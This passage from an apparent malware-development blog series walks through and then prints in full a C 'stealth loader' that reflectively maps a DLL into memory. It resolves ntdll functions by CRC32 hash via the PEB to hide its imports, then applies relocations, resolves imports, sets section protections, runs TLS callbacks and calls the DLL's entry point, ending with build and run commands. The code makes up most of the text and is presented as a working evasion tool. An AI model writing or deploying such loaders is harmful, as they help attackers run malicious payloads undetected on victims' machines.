                else if (executable && readable && !writeable)
                    protect = PAGE_EXECUTE_READ;
                else if (executable && readable && writeable)
                    protect = PAGE_EXECUTE_READWRITE;

                if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
                    protect |= PAGE_NOCACHE;

                void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
                NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t) p_nt_protect_virtual_memory;
                size_t size = section_header->SizeOfRawData;
                void *address = dll_base + section_header->VirtualAddress;
                if((status = g_nt_protect_virtual_memory(NtCurrentProcess(), &address, &size, protect, &protect)) != 0x0)
                    return -7;
            }
        }
    ```
    This code  iterates through each section header of the DLL, analyzes its characteristics, and sets the memory protection accordingly.

        1. **Iterating Through Sections**:
        - The loop iterates through each section header of the DLL (`PIMAGE_SECTION_HEADER`).
        - For each section, it checks if the section has raw data (`SizeOfRawData`).

        2. **Analyzing Characteristics**:
        - It analyzes the characteristics of each section to determine its memory protection.
        - The characteristics (`Characteristics`) of a section determine whether it is executable, readable, or writeable.

        3. **Setting Memory Protection**:
        - Based on the characteristics of the section, the code sets the appropriate memory protection using Windows memory protection constants (`PAGE_EXECUTE`, `PAGE_READWRITE`, etc.).
        - Memory protection ensures that the memory regions are appropriately protected from unauthorized access or modification.

        4. **Handling Cache Settings**:
        - If the section has the `IMAGE_SCN_MEM_NOT_CACHED` characteristic, it adds `PAGE_NOCACHE` to the memory protection.
        - This setting ensures that the section is not cached, which can be useful for certain types of memory operations.

        5. **Calling NtProtectVirtualMemory**:
        - Finally, it calls `NtProtectVirtualMemory` to apply the calculated memory protection to the section.
        - This function is part of the Native API in Windows and is used to change the protection attributes of a region of memory.
        - It takes parameters such as the process handle (`NtCurrentProcess()`), the address of the memory region, the size of the region, and the desired protection settings.

        Overall, this code ensures that each section of the DLL is properly protected with the appropriate memory protection settings, which is crucial for maintaining the integrity and security of the loaded DLL within the process memory space.
    - stealth Loader part 7:
    ```c
        void *p_nt_flush_instruction_cache = get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
        NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t) p_nt_flush_instruction_cache;
        g_nt_flush_instruction_cache((HANDLE) -1, NULL, 0);

        PIMAGE_TLS_CALLBACK *callback;
        PIMAGE_DATA_DIRECTORY tls_entry = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
        if(tls_entry->Size) {
            PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base + tls_entry->VirtualAddress);
            callback = (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
            for(; *callback; callback++)
                (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
        }
    ```
        The provided code  first ensures that any modifications made to the instruction cache are flushed to main memory using the NtFlushInstructionCache function after processing the Import Address Table (IAT). Following this, it checks whether the PE (Portable Executable) file has a TLS (Thread Local Storage) directory entry in its optional header, identified by the IMAGE_DIRECTORY_ENTRY_TLS constant.

        If a TLS directory entry is present, indicating the usage of TLS in the PE file, the code proceeds to retrieve the TLS directory from the PE file. This directory contains various TLS-related data, including a list of TLS callback functions to be executed during thread initialization. The TLS callbacks are functions that the operating system calls automatically when a new thread is created or when the DLL is loaded or unloaded

        1. **Flush Instruction Cache**:
        - It ensures that any modifications made to the instruction cache are flushed to main memory, ensuring that the processor executes the latest version of the code.
        - This is important for ensuring that any changes made to executable code (such as JIT compilation or code patching) are reflected correctly when executed.

        2. **TLS Callback Initialization**:
        - It initializes TLS callbacks if the DLL has TLS directory entries defined.
        - TLS callbacks are functions that are automatically executed when a new thread is created or when the DLL is loaded or unloaded.
        - The code retrieves the TLS directory entry from the DLL's optional header and checks if it contains any TLS data.
        - If TLS data is present, it iterates through the list of TLS callbacks stored in the TLS directory.
        - For each callback function pointer found in the TLS directory, it calls the function, passing the base address of the DLL, the `DLL_PROCESS_ATTACH` flag (indicating that the DLL is being attached to the process), and a `NULL` parameter.
        - This allows the TLS callbacks to perform any necessary initialization tasks when the DLL is loaded into a process.

        Overall, this code ensures that the instruction cache is properly flushed to main memory and that TLS callbacks are correctly initialized, both of which are essential steps during the initialization of a DLL within a process.

        - stealth Loader part 8:
        ```c
            DLLEntry DllEntry = (DLLEntry)((unsigned long long int)dll_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
            (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);

            void *p_nt_close = get_proc_address_by_hash(p_ntdll, NtClose_CRC32b);
            NtClose_t g_nt_close = (NtClose_t) p_nt_close;
            g_nt_close(h_file);

            void *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
            NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
            g_nt_free_virtual_memory(((HANDLE) -1), &dll_bytes, &dll_size, MEM_RELEASE);
        ```
        The provided code snippet performs several critical tasks related to DLL initialization, handle management, and memory deallocation:

        1. **Calculating DLLEntry Address**:
        - It calculates the address of the DLLEntry function within the DLL. The DLLEntry function is a special entry point in a DLL that is executed when the DLL is loaded or unloaded from a process.

        2. **Calling DLLEntry Function**:
        - Once the DLLEntry address is calculated, the code calls it with appropriate arguments. This step allows the DLL to perform any necessary initialization routines when it is loaded into a process.

        3. **Retrieving Function Pointers**:
        - The code retrieves and casts function pointers for the `NtClose` and `NtFreeVirtualMemory` functions from the `ntdll` module. These functions are part of the Native API in Windows and are used for closing handles and freeing virtual memory, respectively.

        4. **Calling Native API Functions**:
        - After retrieving the function pointers, the code calls these functions with relevant arguments. This likely involves closing handles or files using `NtClose` and releasing virtual memory allocated for the DLL using `NtFreeVirtualMemory`.

        Overall, this part of the code handles various aspects of DLL initialization, handle management, and memory deallocation, ensuring proper cleanup and resource release after the DLL has been loaded and executed within a process.

## The stealth Loader
```c
#include <Windows.h>
#include <stdint.h>
#include <stdio.h>
typedef long NTSTATUS;
#define NtCurrentThread() ( (HANDLE)(LONG_PTR) -2 )
#define NtCurrentProcess() ( (HANDLE)(LONG_PTR) -1 )
#define RTL_CONSTANT_STRING(s) { sizeof(s)-sizeof((s)[0]), sizeof(s), s }

#define OBJ_INHERIT                                 0x00000002L
#define OBJ_PERMANENT                               0x00000010L
#define OBJ_EXCLUSIVE                               0x00000020L
#define OBJ_CASE_INSENSITIVE                        0x00000040L
#define OBJ_OPENIF                                  0x00000080L
#define OBJ_OPENLINK                                0x00000100L
#define OBJ_KERNEL_HANDLE                           0x00000200L
#define OBJ_FORCE_ACCESS_CHECK                      0x00000400L
#define OBJ_IGNORE_IMPERSONATED_DEVICEMAP           0x00000800
#define OBJ_DONT_REPARSE                            0x00001000
#define OBJ_VALID_ATTRIBUTES                        0x00001FF2
// File create disposition values
#define FILE_SUPERSEDE                          0x00000000
#define FILE_OPEN                               0x00000001
#define FILE_CREATE                             0x00000002
#define FILE_OPEN_IF                            0x00000003
#define FILE_OVERWRITE                          0x00000004
#define FILE_OVERWRITE_IF                       0x00000005
#define FILE_MAXIMUM_DISPOSITION                0x00000005

#define FILL_STRING(string, buffer)                     \
	string.Length = (USHORT)strlen(buffer);             \
	string.MaximumLength = string.Length;               \
	string.Buffer = buffer

#define InitializeObjectAttributes( p, n, a, r, s ) {   \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

#define SEED 0xDEADDEAD
#define HASH(API)(crc32b((uint8_t *)API))

#define RtlInitUnicodeString_CRC32b         0xe17f353f
#define RtlMultiByteToUnicodeN_CRC32b       0xaba11095
#define LdrLoadDll_CRC32b                   0x43638559
#define LdrGetProcedureAddress_CRC32b       0x3b93e684
#define NtCreateFile_CRC32b                 0x962c4683
#define NtReadFile_CRC32b                   0xab569438
#define NtClose_CRC32b                      0xf78fd98f
#define NtAllocateVirtualMemory_CRC32b      0xec50426f
#define NtReadVirtualMemory_CRC32b          0x58bdb7be
#define NtFreeVirtualMemory_CRC32b          0xf29625d3
#define NtProtectVirtualMemory_CRC32b       0x357d60b3
#define NtFlushInstructionCache_CRC32b      0xc5f7ca5e
#define NtQueryInformationFile_CRC32b       0xb54956cb
typedef struct BASE_RELOCATION_BLOCK {
    DWORD PageAddress;
    DWORD BlockSize;
} BASE_RELOCATION_BLOCK, *PBASE_RELOCATION_BLOCK;

typedef struct BASE_RELOCATION_ENTRY {
    USHORT Offset : 12;
    USHORT Type : 4;
} BASE_RELOCATION_ENTRY, *PBASE_RELOCATION_ENTRY;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } DUMMYUNIONNAME;
    ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
} FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;

typedef enum _FILE_INFORMATION_CLASS {
    FileDirectoryInformation = 1,
    FileFullDirectoryInformation,
    FileBothDirectoryInformation,
    FileBasicInformation,
    FileStandardInformation,
    FileInternalInformation,
    FileEaInformation,
    FileAccessInformation,
    FileNameInformation,
    FileRenameInformation,
    FileLinkInformation,
    FileNamesInformation,
    FileDispositionInformation,
    FilePositionInformation,
    FileFullEaInformation,
    FileModeInformation,
    FileAlignmentInformation,
    FileAllInformation,
    FileAllocationInformation,
    FileEndOfFileInformation,
    FileAlternateNameInformation,
    FileStreamInformation,
    FilePipeInformation,
    FilePipeLocalInformation,
    FilePipeRemoteInformation,
    FileMailslotQueryInformation,
    FileMailslotSetInformation,
    FileCompressionInformation,
    FileObjectIdInformation,
    FileCompletionInformation,
    FileMoveClusterInformation,
    FileQuotaInformation,
    FileReparsePointInformation,
    FileNetworkOpenInformation,
    FileAttributeTagInformation,
    FileTrackingInformation,
    FileIdBothDirectoryInformation,
    FileIdFullDirectoryInformation,
    FileValidDataLengthInformation,
    FileShortNameInformation,
    FileIoCompletionNotificationInformation,
    FileIoStatusBlockRangeInformation,
    FileIoPriorityHintInformation,
    FileSfioReserveInformation,
    FileSfioVolumeInformation,
    FileHardLinkInformation,
    FileProcessIdsUsingFileInformation,
    FileNormalizedNameInformation,
    FileNetworkPhysicalNameInformation,
    FileIdGlobalTxDirectoryInformation,
    FileIsRemoteDeviceInformation,
    FileUnusedInformation,
    FileNumaNodeInformation,
    FileStandardLinkInformation,
    FileRemoteProtocolInformation,
    FileRenameInformationBypassAccessCheck,
    FileLinkInformationBypassAccessCheck,
    FileVolumeNameInformation,
    FileIdInformation,
    FileIdExtdDirectoryInformation,
    FileReplaceCompletionInformation,
    FileHardLinkFullIdInformation,
    FileIdExtdBothDirectoryInformation,
    FileDispositionInformationEx,
    FileRenameInformationEx,
    FileRenameInformationExBypassAccessCheck,
    FileDesiredStorageClassInformation,
    FileStatInformation,
    FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef struct _STRING {
    USHORT Length;
    USHORT MaximumLength;
    PCHAR Buffer;
} ANSI_STRING, *PANSI_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    PVOID SectionPointer;
    ULONG CheckSum;
    ULONG TimeDateStamp;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    // Other members are not needed for this example
} PEB, *PPEB;

// Function to get the base address of ntdll.dll
void* get_ntdll() {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60); // Get PEB from TIB (x64)
#else
    PPEB pPeb;
    __asm__ (
        "movl %%fs:0x30, %0"
        : "=r" (pPeb)
    ); // Get PEB from TIB (x86)
#endif
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)pPeb->Ldr;
    PLIST_ENTRY pListEntry = pLdr->InMemoryOrderModuleList.Flink;

    while (pListEntry != &pLdr->InMemoryOrderModuleList) {
        PLDR_DATA_TABLE_ENTRY pEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (_wcsicmp(pEntry->BaseDllName.Buffer, L"ntdll.dll") == 0) {
            return pEntry->DllBase;
        }
        pListEntry = pListEntry->Flink;
    }
    return NULL;
}

typedef BOOL     (__stdcall *DLLEntry)(HINSTANCE dll, unsigned long reason, void *reserved);
typedef VOID     (__stdcall *PIO_APC_ROUTINE)(PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,ULONG Reserved);
typedef VOID     (__stdcall *RtlInitUnicodeString_t)(PUNICODE_STRING DestinationString, PWSTR SourceString);
typedef NTSTATUS (__stdcall *NtClose_t)(HANDLE);
typedef NTSTATUS (__stdcall *RtlMultiByteToUnicodeN_t)(PWCH UnicodeString,ULONG MaxBytesInUnicodeString,PULONG BytesInUnicodeString,PCSTR MultiByteString,ULONG BytesInMultiByteString);
typedef NTSTATUS (__stdcall *NtReadFile_t)(HANDLE FileHandle,HANDLE Event,PIO_APC_ROUTINE ApcRoutine,PVOID ApcContext,PIO_STATUS_BLOCK IoStatusBlock,PVOID Buffer,ULONG Length,PLARGE_INTEGER ByteOffset,PULONG Key);
typedef NTSTATUS (__stdcall *LdrLoadDll_t)(PCWSTR DllPath, PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID* DllHandle);
typedef NTSTATUS (__stdcall *LdrGetProcedureAddress_t)(PVOID DllHandle, PANSI_STRING ProcedureName, ULONG ProcedureNumber, PVOID* ProcedureAddress);
typedef NTSTATUS (__stdcall *NtCreateFile_t)(PHANDLE FileHandle,ACCESS_MASK DesiredAccess,POBJECT_ATTRIBUTES ObjectAttributes,PIO_STATUS_BLOCK IoStatusBlock,PLARGE_INTEGER AllocationSize,ULONG FileAttributes,ULONG ShareAccess,ULONG CreateDisposition,ULONG CreateOptions,PVOID EaBuffer,ULONG EaLength);
typedef NTSTATUS (__stdcall *NtAllocateVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
typedef NTSTATUS (__stdcall *NtProtectVirtualMemory_t)(HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize, DWORD NewProtect, PULONG OldProtect);
typedef NTSTATUS (__stdcall *NtFreeVirtualMemory_t)(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType);
typedef NTSTATUS (__stdcall *NtReadVirtualMemory_t)(HANDLE ProcessHandle,PVOID BaseAddress,PVOID Buffer,SIZE_T BufferSize,PSIZE_T NumberOfBytesRead);
typedef NTSTATUS (__stdcall *NtFlushInstructionCache_t)(HANDLE ProcessHandle, PVOID BaseAddress, SIZE_T Length);
typedef NTSTATUS (__stdcall *NtQueryInformationFile_t)(HANDLE FileHandle,PIO_STATUS_BLOCK IoStatusBlock,PVOID FileInformation,ULONG Length,FILE_INFORMATION_CLASS FileInformationClass);
// extern void *get_ntdll();

// uint32_t crc32b(const uint8_t *str);

// void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash);
uint32_t crc32b(const uint8_t *str) {
    uint32_t crc = 0xFFFFFFFF;
    uint32_t byte;
    uint32_t mask;
    int i = 0x0;
    int j;

    while (str[i] != 0) {
        byte = str[i];
        crc = crc ^ byte;
        for (j = 7; j >= 0; j--) {
            mask = -1 * (crc & 1);
            crc = (crc >> 1) ^ (SEED & mask);
        }
        i++;
    }
    return ~crc;
}

void *get_proc_address_by_hash(void *dll_address, uint32_t function_hash) {
    void *base = dll_address;
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((DWORD_PTR)base + dos_header->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY export_directory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)base + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    unsigned long *p_address_of_functions = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfFunctions);
    unsigned long *p_address_of_names = (PDWORD)((DWORD_PTR)base + export_directory->AddressOfNames);
    unsigned short *p_address_of_name_ordinals = (PWORD)((DWORD_PTR)base + export_directory->AddressOfNameOrdinals);

    for(unsigned long i = 0; i < export_directory->NumberOfNames; i++) {
        LPCSTR p_function_name = (LPCSTR)((DWORD_PTR)base + p_address_of_names[i]);
        unsigned short p_function_ordinal = (unsigned short)p_address_of_name_ordinals[i];
        unsigned long p_function_address = (unsigned long)p_address_of_functions[p_function_ordinal];

        if(function_hash == HASH(p_function_name))
            return (void *)((DWORD_PTR)base + p_function_address);
    }
    return NULL;
}
int main() {

    NTSTATUS status;
    UNICODE_STRING dll_file;
    WCHAR w_file_path[100] = L"\\??\\\\C:\\Development\\OTE22_BLOGS_MALDEV\\C CODE BLOG\\myloader\\custom_msg.dll";
    void *p_ntdll = get_ntdll();
    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t)p_rtl_init_unicode_string;
    g_rtl_init_unicode_string(&dll_file, w_file_path);

    OBJECT_ATTRIBUTES obj_attrs;
    IO_STATUS_BLOCK io_status_block;
    InitializeObjectAttributes(&obj_attrs, &dll_file, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE h_file = NULL;
    void *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32b);
    NtCreateFile_t g_nt_create_file = (NtCreateFile_t)p_nt_create_file;
    if((status = g_nt_create_file(&h_file, SYNCHRONIZE | GENERIC_READ, &obj_attrs, &io_status_block, 0, 0x0000080, 0x0000007, FILE_OPEN_IF, 0x0000020, 0x0000000, 0)) != 0x0)
        return -1;

    FILE_STANDARD_INFORMATION file_standard_info;
    void *p_nt_query_information_file = get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32b);
    NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t)p_nt_query_information_file;
    if((status = g_nt_query_information_file(h_file, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0)
        return -2;

    unsigned long long int dll_size = file_standard_info.EndOfFile.QuadPart;
    void *dll_bytes = NULL;
    void *p_nt_allocate_virtual_memory = get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
    NtAllocateVirtualMemory_t g_nt_allocate_virtual_memory = (NtAllocateVirtualMemory_t)p_nt_allocate_virtual_memory;
    if((status = g_nt_allocate_virtual_memory(((HANDLE) -1), &dll_bytes, 0, &dll_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
        return -3;

    void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32b);
    NtReadFile_t g_nt_read_file = (NtReadFile_t)p_nt_read_file;
    if((status = g_nt_read_file(h_file, NULL, NULL, NULL, &io_status_block, dll_bytes, dll_size, 0, NULL)) != 0x0)
        return -4;

    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)((unsigned long long int)dll_bytes + dos_header->e_lfanew);
    SIZE_T dll_image_size = nt_headers->OptionalHeader.SizeOfImage;

    void *dll_base = NULL;
    if((status = g_nt_allocate_virtual_memory(NtCurrentProcess(), &dll_base, 0, &dll_image_size, MEM_COMMIT, PAGE_READWRITE)) != 0x0)
        return -4;

    unsigned long long int delta_image_base = (unsigned long long int)dll_base - (unsigned long long int)nt_headers->OptionalHeader.ImageBase;
    memcpy(dll_base, dll_bytes, nt_headers->OptionalHeader.SizeOfHeaders);

    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
    for(size_t i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
        void *section_destination = (LPVOID)((unsigned long long int)dll_base + (unsigned long long int)section->VirtualAddress);
        void *section_bytes = (LPVOID)((unsigned long long int)dll_bytes + (unsigned long long int)section->PointerToRawData);
        memcpy(section_destination, section_bytes, section->SizeOfRawData);
        section++;
    }

    IMAGE_DATA_DIRECTORY relocations = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    unsigned long long int relocation_table = relocations.VirtualAddress + (unsigned long long int)dll_base;
    unsigned long relocations_processed = 0;

    while(relocations_processed < relocations.Size) {
        PBASE_RELOCATION_BLOCK relocation_block = (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);
        relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
        unsigned long relocations_count = (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
        PBASE_RELOCATION_ENTRY relocation_entries = (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);

        for(unsigned long i = 0; i < relocations_count; i++) {
            relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
            if(relocation_entries[i].Type == 0)
                continue;

            unsigned long long int relocation_rva = relocation_block->PageAddress + relocation_entries[i].Offset;
            unsigned long long int address_to_patch = 0;
            void *p_nt_read_virtual_memory = get_proc_address_by_hash(p_ntdll, NtReadVirtualMemory_CRC32b);
            NtReadVirtualMemory_t g_nt_read_virtual_memory = (NtReadVirtualMemory_t)p_nt_read_virtual_memory;
            if((status = g_nt_read_virtual_memory(NtCurrentProcess(), (void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int), NULL)) != 0x0)
                return -5;

            address_to_patch += delta_image_base;
            memcpy((void *)((unsigned long long int)dll_base + relocation_rva), &address_to_patch, sizeof(unsigned long long int));
        }
    }

    PIMAGE_IMPORT_DESCRIPTOR import_descriptor;
    IMAGE_DATA_DIRECTORY images_directory = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    UNICODE_STRING import_library_name;

    import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress + (unsigned long long int)dll_base);
    void *current_library = NULL;

    while(import_descriptor->Name != 0) {
        void *p_ldr_load_dll = get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
        char *module_name = (char *)dll_base + import_descriptor->Name;
        wchar_t w_module_name[MAX_PATH];
        unsigned long num_converted;

        void *p_rtl_multi_byte_to_unicode_n = get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
        RtlMultiByteToUnicodeN_t g_rtl_multi_byte_to_unicode_n = (RtlMultiByteToUnicodeN_t)p_rtl_multi_byte_to_unicode_n;
        if((status = g_rtl_multi_byte_to_unicode_n(w_module_name, sizeof(w_module_name), &num_converted, module_name, strlen(module_name) +1)) != 0x0)
            return -5;

        g_rtl_init_unicode_string(&import_library_name, w_module_name);
        LdrLoadDll_t g_ldr_load_dll = (LdrLoadDll_t)p_ldr_load_dll;
        if((status = g_ldr_load_dll(NULL, NULL, &import_library_name, &current_library)) != 0x0)
            return -6;

        if (current_library){
            ANSI_STRING a_string;
            PIMAGE_THUNK_DATA thunk = NULL;
            PIMAGE_THUNK_DATA original_thunk = NULL;
            thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->FirstThunk);
            original_thunk = (PIMAGE_THUNK_DATA)((unsigned long long int)dll_base + import_descriptor->OriginalFirstThunk);
            while (thunk->u1.AddressOfData != 0){
                void *p_ldr_get_procedure_address = get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
                LdrGetProcedureAddress_t g_ldr_get_procedure_address = (LdrGetProcedureAddress_t)p_ldr_get_procedure_address;
                if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
                    g_ldr_get_procedure_address(current_library, NULL, (WORD) original_thunk->u1.Ordinal, (PVOID *) &(thunk->u1.Function));
                } else {
                    PIMAGE_IMPORT_BY_NAME functionName = (PIMAGE_IMPORT_BY_NAME)((unsigned long long int)dll_base + thunk->u1.AddressOfData);
                    FILL_STRING(a_string, functionName->Name);
                    g_ldr_get_procedure_address(current_library, &a_string, 0, (PVOID *) &(thunk->u1.Function));
                }
                ++thunk;
                ++original_thunk;
            }
        }
        import_descriptor++;
    }

    PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
    for (int i = 0; i < nt_headers->FileHeader.NumberOfSections; i++, section_header++) {
        if (section_header->SizeOfRawData) {
            unsigned long executable = (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
            unsigned long readable = (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
            unsigned long writeable = (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
            unsigned long protect = 0;

            if (!executable && !readable && !writeable)
                protect = PAGE_NOACCESS;
            else if (!executable && !readable && writeable)
                protect = PAGE_WRITECOPY;
            else if (!executable && readable && !writeable)
                protect = PAGE_READONLY;
            else if (!executable && readable && writeable)
                protect = PAGE_READWRITE;
            else if (executable && !readable && !writeable)
                protect = PAGE_EXECUTE;
            else if (executable && !readable && writeable)
                protect = PAGE_EXECUTE_WRITECOPY;
            else if (executable && readable && !writeable)
                protect = PAGE_EXECUTE_READ;
            else if (executable && readable && writeable)
                protect = PAGE_EXECUTE_READWRITE;

            if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
                protect |= PAGE_NOCACHE;

            void *p_nt_protect_virtual_memory = get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
            NtProtectVirtualMemory_t g_nt_protect_virtual_memory = (NtProtectVirtualMemory_t)p_nt_protect_virtual_memory;
            size_t size = section_header->SizeOfRawData;
            void *address = (unsigned long long)dll_base + section_header->VirtualAddress;
            if((status = g_nt_protect_virtual_memory(NtCurrentProcess(), &address, &size, protect, &protect)) != 0x0)
                return -7;
        }
    }

    void *p_nt_flush_instruction_cache = get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
    NtFlushInstructionCache_t g_nt_flush_instruction_cache = (NtFlushInstructionCache_t)p_nt_flush_instruction_cache;
    g_nt_flush_instruction_cache((HANDLE) -1, NULL, 0);

    PIMAGE_TLS_CALLBACK *callback;
    PIMAGE_DATA_DIRECTORY tls_entry = &nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if(tls_entry->Size) {
        PIMAGE_TLS_DIRECTORY tls_dir = (PIMAGE_TLS_DIRECTORY)((unsigned long long int)dll_base + tls_entry->VirtualAddress);
        callback = (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
        for(; *callback; callback++)
            (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
    }

    DLLEntry DllEntry = (DLLEntry)((unsigned long long int)dll_base + nt_headers->OptionalHeader.AddressOfEntryPoint);
    (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);

    void *p_nt_close = get_proc_address_by_hash(p_ntdll, NtClose_CRC32b);
    NtClose_t g_nt_close = (NtClose_t)p_nt_close;
    g_nt_close(h_file);

    void *p_nt_free_virtual_memory = get_proc_address_by_hash(p_ntdll, NtFreeVirtualMemory_CRC32b);
    NtFreeVirtualMemory_t g_nt_free_virtual_memory = (NtFreeVirtualMemory_t)p_nt_free_virtual_memory;
    g_nt_free_virtual_memory(((HANDLE) -1), &dll_bytes, &dll_size, MEM_RELEASE);

    return 0;
} 
```
- compilation stage
    ```c
        gcc -o sl stealth_loader.c 2>&1 | Out-Null
        // we have to run the sl.exe
        ./sl.exe
    ```
![stealth_loader](/assets/images/stealth_loader.png)
- Voila, we have reached the end of the second article in our series on coding our own loader. With each installment, it becomes more independent.

